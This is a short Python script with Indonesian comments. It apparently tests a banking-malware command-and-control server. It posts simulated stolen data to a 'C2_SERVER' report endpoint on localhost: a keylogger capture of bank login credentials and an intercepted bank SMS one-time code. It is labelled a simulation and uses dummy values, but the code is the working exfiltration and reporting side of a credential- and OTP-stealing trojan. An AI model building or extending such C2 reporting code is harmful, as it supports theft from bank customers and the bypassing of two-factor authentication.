import requests
import json
import time

C2_SERVER = "http://localhost:3000"
DEVICE_ID = "test-device-01"

def send_report(log_type, data_content):
    url = f"{C2_SERVER}/api/report"
    payload = {
        "deviceId": DEVICE_ID,
        "log": log_type,
        "data": data_content,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        if response.status_code == 200:
            print(f"[!] Modul [{log_type}] berhasil mengirim data:", response.json())
        else:
            print(f"[-] Gagal mengirim data [{log_type}]")
    except Exception as e:
        print("[!] Error koneksi:", e)

if __name__ == "__main__":
    print("[*] Menjalankan simulasi fitur lanjutan (Keylogger & SMS OTP)...")
    
    # 1. Simulasi Keylogger (Merekam ketukan tombol/input korban pada form login bank)
    time.sleep(1)
    send_report("keylogger_input", "Username: user_banking123 | Password: *********")
    
    # 2. Simulasi Pemintas SMS OTP (Mencegat SMS masuk dari pihak bank)
    time.sleep(2)
    send_report("sms_otp_intercepted", "Sender: BANK_XYZ | Pesan: Kode OTP anda adalah 889214. Jangan berikan pada siapapun.")
    
    print("[*] Simulasi exfiltrasi data lanjutan selesai.")
